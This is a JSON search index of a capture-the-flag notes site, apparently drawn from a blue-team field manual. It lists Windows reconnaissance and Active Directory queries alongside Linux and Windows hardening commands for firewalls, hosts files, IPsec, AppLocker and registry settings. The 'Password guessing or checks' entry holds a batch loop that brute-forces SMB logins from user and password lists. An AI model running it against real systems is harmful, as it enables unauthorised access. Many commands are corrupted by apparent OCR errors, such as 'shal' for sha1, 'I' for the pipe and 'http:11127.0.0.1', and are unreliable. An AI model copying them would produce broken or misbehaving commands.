R2:"},{"location":"capturetheflag/basic/identify/windows/#ref","text":"","title":"ref"},{"location":"capturetheflag/basic/identify/windows/#enable-dns-logging","text":"C:\\> DNSCmd <DNS SERVER NAME> /config /logLevel0x8100F331","title":"Enable DNS Logging:"},{"location":"capturetheflag/basic/identify/windows/#set-log-location","text":"C:\\> DNSCmd <DNS SERVER NAME> /config /LogFilePath<PATH TO LOG FILE>","title":"Set log location:"},{"location":"capturetheflag/basic/identify/windows/#set-size-of-log-file","text":"C:\\> DNSCmd <DNS SERVER NAME> /config/logfilemaxsize 0xffffffff","title":"Set size of log file:"},{"location":"capturetheflag/basic/identify/windows/#hashing","text":"","title":"HASHING"},{"location":"capturetheflag/basic/identify/windows/#file-checksum-integrity-verifier-fciv","text":"","title":"File Checksum Integrity Verifier (FCIV):"},{"location":"capturetheflag/basic/identify/windows/#ref_1","text":"","title":"Ref"},{"location":"capturetheflag/basic/identify/windows/#hash-a-file","text":"C:\\> fciv.exe <FILE TO HASH>","title":"Hash a file:"},{"location":"capturetheflag/basic/identify/windows/#hash-all-files-on-c32into-a-database-file","text":"C:\\> fciv.exe c:\\ -r -mdS -xml <FILE NAME>.xml","title":"Hash all files on C: into a database file:"},{"location":"capturetheflag/basic/identify/windows/#list-all-hashed-files","text":"C:\\> fciv.exe -list -shal -xml <FILE NAME>.xml","title":"List all hashed files:"},{"location":"capturetheflag/basic/identify/windows/#verify-previous-hashes-in-db-with-file-system","text":"C:\\> fciv.exe -v -shal -xml <FILE NAME>.xml Note: May be possible to create a master db and compare to all systems from a cmd line. Fast baseline and difference. Ref PS C:\\> Get-FileHash <FILE TO HASH> I Format-List PS C:\\> Get-FileHash -algorithm md5 <FILE TO HASH> C:\\> certutil -hashfile <FILE TO HASH> SHAl C:\\> certutil -hashfile <FILE TO HASH> MD5","title":"Verify previous hashes in db with file system:"},{"location":"capturetheflag/basic/identify/windows/#netbios","text":"","title":"NETBIOS"},{"location":"capturetheflag/basic/identify/windows/#basic-nbtstat-scan","text":"C:\\> nbtstat -A <IP ADDRESS>","title":"Basic nbtstat scan:"},{"location":"capturetheflag/basic/identify/windows/#cached-netbios-info-on-localhost","text":"C:\\> nbtstat -c","title":"Cached NetBIOS info on localhost:"},{"location":"capturetheflag/basic/identify/windows/#script-loop-scan","text":"C:\\> for /L %I in (1,1,254) do nbstat -An 192.168.l.%I","title":"Script loop scan:"},{"location":"capturetheflag/basic/identify/windows/#user-activity","text":"Ref","title":"USER ACTIVITY"},{"location":"capturetheflag/basic/identify/windows/#get-users-logged-on","text":"C:\\> psloggedon \\\\computername","title":"Get users logged on:"},{"location":"capturetheflag/basic/identify/windows/#script-loop-scan_1","text":"C:\\> for /L %i in (1,1,254) do psloggedon\\\\192.168.l.%i >> C:\\users_output.txt","title":"Script loop scan:"},{"location":"capturetheflag/basic/identify/windows/#passwords","text":"","title":"PASSWORDS"},{"location":"capturetheflag/basic/identify/windows/#password-guessing-or-checks","text":"# for /f %i in (<PASSWORD FILE NAME>.txt) do @echo %i & net use \\\\<TARGET IP ADDRESS> %i /u:<USERNAME> 2>nul && pause # for /f %i in (<USER NAME FILE>.txt) do @(for /f %j in (<PASSWORD FILE NAME>.txt) do @echo %i:%j & @net use \\\\<TARGET IP ADDRESS> %j /u:%i 2>nul && echo %i:%j >> success.txt && net use \\\\<IP ADDRESS>/del) MICROSOFT BASELINE SECURITY ANALYZER (MBSA)","title":"Password guessing or checks:"},{"location":"capturetheflag/basic/identify/windows/#basic-scan-of-a-target-ip-address","text":"C:\\> mbsacli.exe /target <TARGET IP ADDRESS> /n os+iis+sql+password","title":"Basic scan of a target IP address:"},{"location":"capturetheflag/basic/identify/windows/#basic-scan-of-a-target-ip-range","text":"C:\\> mbsacli.exe /r <IP ADDRESS RANGE> /n os+iis+sql+password","title":"Basic scan of a target IP range:"},{"location":"capturetheflag/basic/identify/windows/#basic-scan-of-a-target-domain","text":"C:\\> mbsacli.exe /d <TARGET DOMAIN> /n os+iis+sql+password","title":"Basic scan of a target domain:"},{"location":"capturetheflag/basic/identify/windows/#basic-scan-of-a-target-computer-names-in-text-file","text":"C:\\> mbsacli.exe /listfile <LISTNAME OF COMPUTERNAMES>.txt /n os+iis+sql+password","title":"Basic scan of a target computer names in text file:"},{"location":"capturetheflag/basic/identify/windows/#active-directory-inventory-list-all-ous","text":"C:\\> dsquery ou DC=<DOMAIN>,DC=<DOMAIN EXTENSION>","title":"ACTIVE DIRECTORY INVENTORY List all OUs:"},{"location":"capturetheflag/basic/identify/windows/#list-of-workstations-in-the-domain","text":"C:\\> netdom query WORKSTATION","title":"List of workstations in the domain:"},{"location":"capturetheflag/basic/identify/windows/#list-of-servers-in-the-domain","text":"C:\\> netdom query SERVER","title":"List of servers in the domain:"},{"location":"capturetheflag/basic/identify/windows/#list-of-domain-controllers","text":"C:\\> netdom query DC","title":"List of domain controllers:"},{"location":"capturetheflag/basic/identify/windows/#list-of-organizational-units-under-which-the-specified-user-can-create-a-machine-object","text":"C:\\> netdom query OU","title":"List of organizational units under which the specified user can create a machine object:"},{"location":"capturetheflag/basic/identify/windows/#list-of-primary-domain-controller","text":"C:\\> netdom query PDC","title":"List of primary domain controller:"},{"location":"capturetheflag/basic/identify/windows/#list-the-domain-trusts","text":"C:\\> netdom query TRUST","title":"List the domain trusts:"},{"location":"capturetheflag/basic/identify/windows/#query-the-domain-for-the-current-list-of-fsmo-owners","text":"C:\\> netdom query FSMO","title":"Query the domain for the current list of FSMO owners"},{"location":"capturetheflag/basic/identify/windows/#list-all-computers-from-active-directory","text":"C:\\> dsquery COMPUTER \"OU=servers,DC=<DOMAINNAME>,DC=<DOMAIN EXTENSION>\" -o rdn -limit 0 > C:\\machines.txt","title":"List all computers from Active Directory:"},{"location":"capturetheflag/basic/identify/windows/#list-user-accounts-inactive-longer-than-3-weeks","text":"C:\\> dsquery user domainroot -inactive 3","title":"List user accounts inactive longer than 3 weeks:"},{"location":"capturetheflag/basic/identify/windows/#find-anything-or-user-created-on-date-in-utc-using-timestamp-format-yyyymmddhhmmsssz","text":"C:\\> dsquery * -filter\"(whenCreated>=20101022083730,0Z)\" C:\\> dsquery * -filter\"((whenCreated>=20101022083730.0Z)&(objectClass=user))II","title":"Find anything (or user) created on date in UTC using timestamp format YYYYMMDDHHMMSS.sZ:"},{"location":"capturetheflag/basic/identify/windows/#alt-option","text":"C:\\> ldifde -d ou=<OU NAME>,dC=<DOMAINNAME>,dc=<DOMAIN EXTENSION> -l whencreated,whenchanged -p onelevel -r \"(ObjectCategory=user)\" -f <OUTPUT FILENAME>","title":"Alt option:"},{"location":"capturetheflag/basic/identify/windows/#the-last-logon-timestamp-format-in-utcyyyymmddhhmmss-alt-option","text":"C:\\> dsquery * dc=<DOMAIN NAME>,dc=<DOMAINEXTENSION> -filter \"(&(objectCategory=Person)(objectClass=User)(whenCreated>=20151001000000.0Z))\"","title":"The last logon timestamp format in UTC:YYYYMMDDHHMMSS Alt option:"},{"location":"capturetheflag/basic/identify/windows/#alt-option_1","text":"C:\\> adfind -csv -b dc=<DOMAIN NAME>,dc=<DOMAINEXTENSION> -f \"(&(objectCategory=Person)(objectClass=User)(whenCreated>=20151001000000.0Z))\"","title":"Alt option:"},{"location":"capturetheflag/basic/identify/windows/#using-powershell-dump-new-active-directory-accounts-in-last-90-days","text":"PS C:\\> import-module activedirectory PS C:\\> Get-QADUser -CreatedAfter (GetDate).AddDays(-90) PS C:\\> Get-ADUser -Filter * -Properties whenCreatedI Where-Object {$_.whenCreated -ge ((GetDate).AddDays(-90)).Date}","title":"Using PowerShell, dump new Active Directory accounts in last 90 Days:"},{"location":"capturetheflag/basic/prootect_defend/linux/","text":"DISABLE/STOP SERVICES Services information: service --status-all ps -ef ps -aux Get a list of upstart jobs: initctl list Example of start, stop, restarting a service in Ubuntu: /etc/init,d/apache2 start /etc/init.d/apache2 restart /etc/init.d/apache2 stop (stops only until reboot) service mysql start service mysql restart service mysql stop (stops only until reboot) List all Upstart services: ls /etc/init/*,conf Show if a program is managed by upstart and the process ID: status ssh If not managed by upstart: update-rc.d apache2 disable service apache2 stop HOST SYSTEM FIREWALLS Export existing iptables firewall rules: iptables-save > firewall.out Edit firewall rules and chains in firewall.out and save the file: nano firewall.out Apply iptables: iptables-restore < firewall.out Example iptables commands (IP, IP Range, Port Blocks): iptables -A INPUT -s 10.10.10.10 -j DROP iptables -A INPUT -s 10,10.10.0/24 -j DROP iptables -A INPUT -p tcp --dport ssh 10.10.10.10 -j DROP iptables -A INPUT -p tcp --dport ssh -j DROP Block all connections: iptables-policy INPUT DROP iptables-policy OUTPUT DROP iptables-policy FORWARD DROP Log all denied iptables rules: iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix \"iptables denied: \" --log-level 7 Save all current iptables rules: Ubuntu: /etc/init.d/iptables save /sbin/service iptables save RedHat / CentOS: /etc/init.d/iptables save /sbin/iptables-save ```` ## List all current iptables rules: iptables -L ## Flush all current iptables rules: iptables -F ## Start/Stop iptables service: service iptables start service iptables stop ## Start/Stop ufw service: ufw enable ufw disable ## Start/Stop ufw logging: ufw logging on ufw logging off ## Backup all current ufw rules: cp /lib/ufw/{user.rules,user6.rules} / cp /lib/ufw/{user.rules,user6.rules} ./ ## Example uncomplicated firewall (ufw) Commands (IP,IP range, Port blocks): ufw status verbose ufw delete ufw allow for ufw allow all 80/tcp ufw allow all ssh ufw deny from proto udp to any port 443 # PASSWORDS ## Change password: passwd (For current user) passwd bob (For user Bob) sudo su passwd (For root) # HOST FILE ## Add new malicious domain to hosts file, and route to localhost: echo 127.0.0,1 >> /etc/hosts ## Check if hosts file is working, by sending ping to 127.0.0.1: ping -c 1 ## Ubuntu/Debian DNS cache flush: /etc/init.d/dns-clean start ## Flush nscd DNS cache four ways: /etc/init.d/nscd restart service nscd restart service nscd reload nscd -i hosts ```` Flush dnsmasq DNS cache: /etc/init.d/dnsmasq restart WHITELIST Use a Proxy Auto Config(PAC) file to create bad URLor IP List: function FindProxyForURL(url, host) { // Send bad DNS name to the proxy if (dnsDomainis(host, \",badsite.com\")) return \"PROXY http:11127.0.0.1:8080\"; // Send bad IPs to the proxy if (isinNet(myipAddress(), \"222.222.222.222\", \"255.255.255.0\")) return \"PROXY http:11127.0.0.1:8080\"; // All other traffic bypass proxy return \"DIRECT\"; } IPSEC Allow firewall to pass IPSEC traffic: iptables -A INPUT -p esp -j ACCEPT iptables -A INPUT -p ah -j ACCEPT iptables -A INPUT -p udp --dport 500 -j ACCEPT iptables -A INPUT -p udp --dport 4500 -j ACCEPT Pass IPSEC traffic: Step 1: ``` Install Racoon utility on and to enable IPSEC tunnel inUbuntu. apt-get install racoon ``` Step 2: ``` Choose direct then edit letclipsectools.conf on and . flush; spdflush; spdadd any -P out ipsec esp/transport//require; s pdadd any -P in ipsec esp/transport//require; ``` Step 3: Edit /etc/racoon/racoon.conf on <HOSTl IP ADDRESS> and <HOST2 IP ADDRESS>, log notify; path pre_shared_key \"/etc/racoon/psk.txt\"; path certificate \"/etc/racoon/certs\"; remote anonymous { exchange_mode main,aggressive; proposal { encryption_algorithm aes_256; hash_algorithm sha256; authentication_method pre_shared_key; dh_group modp1024; } generate_policy off; } sainfo anonymous{ } Step 4: Add preshared key to both hosts.On HOSTl: echo <HOST2 IP ADDRESS> <PRESHARED PASSWORD> >>/etc/racoon/psk.txt On HOST2: echo <HOSTl IP ADDRESS> <PRESHARED PASSWORD> >>/etc/racoon/psk.txt Step 5: Restart service on both systems. service setkey restart Check security associations, configuration and polices: setkey -D setkey -DP","title":"linux"},{"location":"capturetheflag/basic/prootect_defend/linux/#disablestop-services","text":"","title":"DISABLE/STOP SERVICES"},{"location":"capturetheflag/basic/prootect_defend/linux/#services-information","text":"service --status-all ps -ef ps -aux","title":"Services information:"},{"location":"capturetheflag/basic/prootect_defend/linux/#get-a-list-of-upstart-jobs","text":"initctl list","title":"Get a list of upstart jobs:"},{"location":"capturetheflag/basic/prootect_defend/linux/#example-of-start-stop-restarting-a-service-in","text":"Ubuntu: /etc/init,d/apache2 start /etc/init.d/apache2 restart /etc/init.d/apache2 stop (stops only until reboot) service mysql start service mysql restart service mysql stop (stops only until reboot)","title":"Example of start, stop, restarting a service in"},{"location":"capturetheflag/basic/prootect_defend/linux/#list-all-upstart-services","text":"ls /etc/init/*,conf","title":"List all Upstart services:"},{"location":"capturetheflag/basic/prootect_defend/linux/#show-if-a-program-is-managed-by-upstart-and-the-process-id","text":"status ssh","title":"Show if a program is managed by upstart and the process ID:"},{"location":"capturetheflag/basic/prootect_defend/linux/#if-not-managed-by-upstart","text":"update-rc.d apache2 disable service apache2 stop","title":"If not managed by upstart:"},{"location":"capturetheflag/basic/prootect_defend/linux/#host-system-firewalls","text":"","title":"HOST SYSTEM FIREWALLS"},{"location":"capturetheflag/basic/prootect_defend/linux/#export-existing-iptables-firewall-rules","text":"iptables-save > firewall.out","title":"Export existing iptables firewall rules:"},{"location":"capturetheflag/basic/prootect_defend/linux/#edit-firewall-rules-and-chains-in-firewallout-and-save-the-file","text":"nano firewall.out","title":"Edit firewall rules and chains in firewall.out and save the file:"},{"location":"capturetheflag/basic/prootect_defend/linux/#apply-iptables","text":"iptables-restore < firewall.out","title":"Apply iptables:"},{"location":"capturetheflag/basic/prootect_defend/linux/#example-iptables-commands-ip-ip-range-port-blocks","text":"iptables -A INPUT -s 10.10.10.10 -j DROP iptables -A INPUT -s 10,10.10.0/24 -j DROP iptables -A INPUT -p tcp --dport ssh 10.10.10.10 -j DROP iptables -A INPUT -p tcp --dport ssh -j DROP","title":"Example iptables commands (IP, IP Range, Port Blocks):"},{"location":"capturetheflag/basic/prootect_defend/linux/#block-all-connections","text":"iptables-policy INPUT DROP iptables-policy OUTPUT DROP iptables-policy FORWARD DROP","title":"Block all connections:"},{"location":"capturetheflag/basic/prootect_defend/linux/#log-all-denied-iptables-rules","text":"iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix \"iptables denied: \" --log-level 7","title":"Log all denied iptables rules:"},{"location":"capturetheflag/basic/prootect_defend/linux/#save-all-current-iptables-rules","text":"Ubuntu: /etc/init.d/iptables save /sbin/service iptables save RedHat / CentOS: /etc/init.d/iptables save /sbin/iptables-save ```` ## List all current iptables rules: iptables -L ## Flush all current iptables rules: iptables -F ## Start/Stop iptables service: service iptables start service iptables stop ## Start/Stop ufw service: ufw enable ufw disable ## Start/Stop ufw logging: ufw logging on ufw logging off ## Backup all current ufw rules: cp /lib/ufw/{user.rules,user6.rules} / cp /lib/ufw/{user.rules,user6.rules} ./ ## Example uncomplicated firewall (ufw) Commands (IP,IP range, Port blocks): ufw status verbose ufw delete ufw allow for ufw allow all 80/tcp ufw allow all ssh ufw deny from proto udp to any port 443 # PASSWORDS ## Change password: passwd (For current user) passwd bob (For user Bob) sudo su passwd (For root) # HOST FILE ## Add new malicious domain to hosts file, and route to localhost: echo 127.0.0,1 >> /etc/hosts ## Check if hosts file is working, by sending ping to 127.0.0.1: ping -c 1 ## Ubuntu/Debian DNS cache flush: /etc/init.d/dns-clean start ## Flush nscd DNS cache four ways: /etc/init.d/nscd restart service nscd restart service nscd reload nscd -i hosts ````","title":"Save all current iptables rules:"},{"location":"capturetheflag/basic/prootect_defend/linux/#flush-dnsmasq-dns-cache","text":"/etc/init.d/dnsmasq restart","title":"Flush dnsmasq DNS cache:"},{"location":"capturetheflag/basic/prootect_defend/linux/#whitelist","text":"","title":"WHITELIST"},{"location":"capturetheflag/basic/prootect_defend/linux/#use-a-proxy-auto-configpac-file-to-create-bad-urlor-ip-list","text":"function FindProxyForURL(url, host) { // Send bad DNS name to the proxy if (dnsDomainis(host, \",badsite.com\")) return \"PROXY http:11127.0.0.1:8080\"; // Send bad IPs to the proxy if (isinNet(myipAddress(), \"222.222.222.222\", \"255.255.255.0\")) return \"PROXY http:11127.0.0.1:8080\"; // All other traffic bypass proxy return \"DIRECT\"; }","title":"Use a Proxy Auto Config(PAC) file to create bad URLor IP List:"},{"location":"capturetheflag/basic/prootect_defend/linux/#ipsec","text":"","title":"IPSEC"},{"location":"capturetheflag/basic/prootect_defend/linux/#allow-firewall-to-pass-ipsec-traffic","text":"iptables -A INPUT -p esp -j ACCEPT iptables -A INPUT -p ah -j ACCEPT iptables -A INPUT -p udp --dport 500 -j ACCEPT iptables -A INPUT -p udp --dport 4500 -j ACCEPT","title":"Allow firewall to pass IPSEC traffic:"},{"location":"capturetheflag/basic/prootect_defend/linux/#pass-ipsec-traffic","text":"","title":"Pass IPSEC traffic:"},{"location":"capturetheflag/basic/prootect_defend/linux/#step-1","text":"``` Install Racoon utility on and to enable IPSEC tunnel inUbuntu. apt-get install racoon ```","title":"Step 1:"},{"location":"capturetheflag/basic/prootect_defend/linux/#step-2","text":"``` Choose direct then edit letclipsectools.conf on and . flush; spdflush; spdadd any -P out ipsec esp/transport//require; s pdadd any -P in ipsec esp/transport//require; ```","title":"Step 2:"},{"location":"capturetheflag/basic/prootect_defend/linux/#step-3","text":"Edit /etc/racoon/racoon.conf on <HOSTl IP ADDRESS> and <HOST2 IP ADDRESS>, log notify; path pre_shared_key \"/etc/racoon/psk.txt\"; path certificate \"/etc/racoon/certs\"; remote anonymous { exchange_mode main,aggressive; proposal { encryption_algorithm aes_256; hash_algorithm sha256; authentication_method pre_shared_key; dh_group modp1024; } generate_policy off; } sainfo anonymous{ }","title":"Step 3:"},{"location":"capturetheflag/basic/prootect_defend/linux/#step-4","text":"Add preshared key to both hosts.On HOSTl: echo <HOST2 IP ADDRESS> <PRESHARED PASSWORD> >>/etc/racoon/psk.txt On HOST2: echo <HOSTl IP ADDRESS> <PRESHARED PASSWORD> >>/etc/racoon/psk.txt","title":"Step 4:"},{"location":"capturetheflag/basic/prootect_defend/linux/#step-5","text":"Restart service on both systems. service setkey restart Check security associations, configuration and polices: setkey -D setkey -DP","title":"Step 5:"},{"location":"capturetheflag/basic/prootect_defend/windows/","text":"DISABLE/STOP SERVICES Get a list of services and disable or stop: C:\\> sc query C:\\> sc config \"<SERVICE NAME>\" start= disabled C:\\> sc stop \"<SERVICE NAME>\" C:\\> wmic service where name='<SERVICE NAME>' callChangeStartmode Disabled HOST SYSTEM FIREWALLS Show all rules: C:\\> netsh advfirewall firewall show rule name=all Set firewall on/off: C:\\> netsh advfirewall set currentprofile state on C:\\> netsh advfirewall set currentprofilefirewallpolicy blockinboundalways,allowoutbound C:\\> netsh advfirewall set publicprofile state on C:\\> netsh advfirewall set privateprofile state on C:\\> netsh advfirewall set domainprofile state on C:\\> netsh advfirewall set allprofile state on C:\\> netsh advfirewall set allprof ile state offSet firewall rules examples: C:\\> netsh advfirewall firewall add rule name=\"OpenPort 80\" dir=in action=allow protocol=TCPlocalport=80 C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=al lowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yes C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=al lowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yesremoteip=157.60.0.1,172.16.0.0/16,Local5ubnetprof i le=domain C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=allowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yesremoteip=157.60.0.1,172.16.0.0/16,LocalSubnetprofile=domain C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=al lowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yesremoteip=157.60.0.1,172.16.0.0/16,Local5ubnetprofile=private C:\\> netsh advfirewall firewall delete rulename=rule name program=\"C:\\MyApp\\MyApp.exe\" C:\\> netsh advfirewall firewall delete rulename=rule name protocol=udp localport=500 C:\\> netsh advfirewall firewall set rulegroup=\" remote desktop\" new enable=Yes prof ile=domain C:\\> netsh advfirewall firewall set rulegroup=\"remote desktop\" new enable=No profile=publicSetup togging location: C:\\> netsh advfirewall set currentprofile logging C:\\<LOCATION>\\<FILE NAME>Windows firewall tog location and settings: C:\\> more %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log C:\\> netsh advfirewall set allprofile loggingmaxfilesize 4096 C:\\> netsh advfirewall set allprofile loggingdroppedconnections enable C:\\> netsh advfirewall set allprofile loggingallowedconnections enable Display firewall logs: PS C:\\> Get-Content$env:systemroot\\system32\\LogFiles\\Firewall\\pfirewall. log PASSWORDS Change password: C:\\> net user <USER NAME> * /domain C:\\> net user <USER NAME> <NEW PASSWORD> Change password remotely: C:\\> pspasswd.exe \\\\<IP ADDRESS or NAME OF REMOTECOMPUTER> -u <REMOTE USER NAME> -p <NEW PASSWORD> Change password remotely: PS C:\\> pspasswd.exe \\\\<IP ADDRESS or NAME OF REMOTECOMPUTER>HOST FILE Flush DNS of malicious domain/IP: C:\\> ipconfig /flushdns Flush NetBios cache of host/IP: C:\\> nbtstat -R Add new malicious domain to hosts file, and route tolocalhost: C:\\> echo 127.0.0.1 <MALICIOUS DOMAIN> >> C:\\Windows\\System32\\drivers\\etc\\hosts Check if hosts file is working, by sending ping to 127.0.0.1: C:\\> ping <MALICIOUS DOMAIN> -n 1 WHITELIST Use a Proxy Auto Config(PAC) file to create Bad URL or IP List (IE, Firefox, Chrome): function FindProxyForURL(url, host) { // II Send bad DNS name to the proxy if (dnsDomainis(host, \".badsite.com\")) return \"PROXY http:11127.0.0.1:8080\"; // II Send bad IPs to the proxy if (isinNet(myipAddress(), \"222.222.222.222\",\"255.255.255.0\")) return \"PROXY http:11127.0.0.1:8080\"; //II All other traffic bypass proxy return \"DIRECT\"; } APPLICATION RESTRICTIONS Applocker - Server 2008 R2 or Windows 7 or higher: Using GUI Wizard configure: Executable Rules (. exe, . com) DLL Rules ( .dll, .ocx) Script Rules (.psl, .bat, .cmd, .vbs, .js) Windows Install Rules ( .msi, .msp, .mst) Steps to employ Applocker (GUI is needed for digitalsigned app restrictions): Step 1: Create a new GPO. Step 2: Right-click on it to edit, and then navigate through Computer Configuration, Policies, Windows Settings, Security Settings, Application Control Policies and Applocker. Click Configure Rule Enforcement. Step 3: Under Executable Rules, check the Configured box and then make sure Enforce Rules is selected from the drop-down box. Click OK. Step 4: In the left pane, click Executable Rules. Step 5: Right-click in the right pane and select Create New Rule. Step 6: On the Before You Begin screen, click Next. Step 7: On the Permissions screen, click Next. Step 8: On the Conditions screen, select the Publisher condition and click Next. Step 9: Click the Browse button and browse to any executable file on your system. It doesn't matter which. Step 10: Drag the slider up to Any Publisher and then click Next. Step 11: Click Next on the Exceptions screen. Step 12: Name policy, Example uonly run executables that are signed\" and click Create. Step 13: If this is your first time creating an Applocker policy, Windows will prompt you to create default rule, click Yes. Step 14: Ensure Application Identity Service isRunning. C:\\> net start AppIDSvc C:\\> REG add\"HKLM\\SYSTEM\\CurrentControlSet\\services\\AppIDSvc\" /v Start /t REG_DWORD /d 2 /f Step 15: Changes require reboot. C:\\ shutdown.exe /r C:\\ shutdown.exe /r /m \\\\<IP ADDRESS OR COMPUTERNAME> /f Add the Applocker cmdlets into PowerShell: PS C:\\> import-module Applocker Gets the file information for all of the executable files and scripts in the directory C:\\Windows\\System32: PS C:\\> Get-ApplockerFileinformation -Directory C:\\Windows\\System32\\ -Recurse -FileType Exe, Script Create a Applocker Policy that allow rules for all of the executable files in C:\\Windows\\System32: PS C:\\> Get-Childitem C:\\Windows\\System32\\*,exe IGet-ApplockerFileinformation I New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32 Sets the local Applocker policy to the policy specified in C:\\Policy.xml: PS C:\\> Set-AppLockerPolicy -XMLPolicy C:\\Policy.xml Uses the Applocker policy in C:\\Policy.xml to test whether calc.exe and notepad.exe are allowed to run for users who are members of the Everyone group. If you do not specify a group, the Everyone group is used by default: PS C:\\> Test-AppLockerPolicy -XMLPolicy C:\\Policy.xml -Path C:\\Windows\\System32\\calc.exe, C:\\Windows\\System32\\notepad.exe -User Everyone Review how many times a file would have been blocked from running if rules were enforced: PS C:\\> Get-ApplockerFileinformation -Eventlog -Logname \"Microsoft-Windows-Applocker\\EXE and DLL\" -EventType Audited -Statistics Creates a new Applocker policy from the auditedevents in the local Microsoft-Windows-Applocker/EXE and DLL event log, applied to and current Applocker policy will be overwritten: PS C:\\> Get-ApplockerFileinformation -Eventlog -LogPath \"Microsoft-Windows-AppLocker/EXE and DLL\" -EventType Audited I New-ApplockerPolicy -RuleType Publisher,Hash -User domain\\<GROUP> -IgnoreMissingFileinformation I Set-ApplockerPolicy -LDAP \"LDAP://<DC>,<DOMAIN>.com/CN={31B2F340-016D11D2-945F00C04FB984F9},CN=Policies,CN=System,DC=<DOMAIN>,DC=com\" Export the local Applocker policy, comparing User'sexplicitly denied access to run, and output textfile: PS C:\\> Get-AppLockerPolicy -Local I TestAppLockerPolicy -Path C:\\Windows\\System32\\*,exe -User domain\\<USER NAME> -Filter Denied I Format-List -Property Path > C:\\DeniedFiles.txt Export the results of the test to a file foranalysis: PS C:\\> Get-Childitem <DirectoryPathtoReview> -Filter <FileExtensionFilter> -Recurse I Convert-Path I Test-ApplockerPolicy -XMLPolicy <PathToExportedPolicyFile> -User <domain\\username> -Filter <TypeofRuletoFilterFor> I Export-CSV <PathToExportResultsTo.CSV> GridView list of any local rules applicable: PS C:\\> Get-AppLockerPolicy -Local -Xml I OutGridView IPSEC Create a IPSEC Local Security Policy, applied to any connection, any protocol, and using a preshared key: C:\\> netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY C:\\> netsh ipsec static add filteraction name=MyIPsecAction action=negotiate C:\\> netsh ipsec static add policy name=MyIPsecPolicy assign=yes C:\\> netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all activate=yes psk=<PASSWORD> Add rule to allow web browsing port 80(HTTP) and 443(HTTPS) over IPSEC: C:\\> netsh ipsec static add filteraction name=Allow action=permit C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80 C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443 C:\\> netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=<PASSWORD> Shows the IPSEC Local Security Policy with name \"MyIPsecPolicy\": C:\\> netsh ipsec static show policy name=MyIPsecPolicy Stop or Unassign a IPSEC Policy: C:\\> netsh ipsec static set policy name=MyIPsecPolicy Create a IPSEC Advance Firewall Rule and Policy and preshared key from and to any connections: C:\\> netsh advfirewall consec add rule name=\"IPSEC\" endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default Require IPSEC preshared key on all outgoing requests: C:\\> netsh advfirewall firewall add rule name=uIPSEC_Out\" dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any interfacetype=any security=authenticate Create a rule for web browsing: C:\\> netsh advfirewall firewall add rule name=\"Allow Outbound Port 8011 dir=out localport=80 protocol=TCP action=allow Create a rule for DNS: C:\\> netsh advfirewall firewall add rule name=\"Allow Outbound Port 5311 dir=out localport=53 protocol=UDP action=allow Delete ISPEC Rule: C:\\> netsh advfirewall firewall delete rule name=\"IPSEC_RULE\" ACTIVE DIRECTORY (AD) - GROUP POLICY OBJECT (GPO) Get and force new policies: C:\\> gpupdate /force C:\\> gpupdate /sync Audit Success and Failure for user Bob: C:\\> auditpol /set /user:bob /category:\"DetailedTracking\" /include /success:enable /failure:enable Create an Organization Unit to move suspected or infected users and machines: C:\\> dsadd OU <QUARANTINE BAD OU> Move an active directory user object into NEW GROUP: PS C:\\> Move-ADObject 'CN=<USER NAME>,CN=<OLD USERGROUP>,DC=<OLD DOMAIN>,DC=<OLD EXTENSION>' -TargetPath 'OU=<NEW USER GROUP>,DC=<OLDDOMAIN>,DC=<OLD EXTENSION>' Alt Option: C:\\> dsmove \"CN=<USER NAME>,OU=<OLD USER OU>,DC=<OLDDOMAIN>,DC=<OLD EXTENSION>\" -newparent OU=<NEW USERGROUP>,DC=<OLD DOMAIN>,DC=<OLD EXTENSION> STAND ALONE SYSTEM - WITHOUT ACTIVE DIRECTORY (AD) Disallow running a .exe file: C:\\> reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v DisallowRun /t REG_DWORD /d\"00000001\" /f C:\\> reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v badfile.exe /t REG_SZ/d <BAD FILE NAME>.exe /f Disable Remote Desktop: C:\\> reg add \"HKLM\\SYSTEM\\Cu rrentCont ro lSet\\Cont ro l \\ TerminalServer\" /f /v fDenyTSConnections /t REG_DWORD /d 1 Send NTLMv2 response only/refuse LM and NTLM:(Windows 7 default) C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /vlmcompatibilitylevel /t REG_DWORD /d 5 /f Restrict Anonymous Access: C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v restrictanonymous /t REG_DWORD /d 1 /f Do not allow anonymous enumeration of SAM accounts and shares: C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v restrictanonymoussam /t REG_DWORD /d 1 /f Disable IPV6: C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TCPIP6\\Parameters /v DisabledComponents /t REG_DWORD /d 255 /f Disable sticky keys: C:\\> reg add \"HKCU\\ControlPanel\\Accessibility\\StickyKeys\" /v Flags /t REG_SZ/d 506 /f Disable Toggle Keys: C:\\> reg add \"HKCU\\ControlPanel \\Accessibility\\ ToggleKeys\" /v Flags /t REG_SZId 58 /f Disable Filter Keys: C:\\> reg add 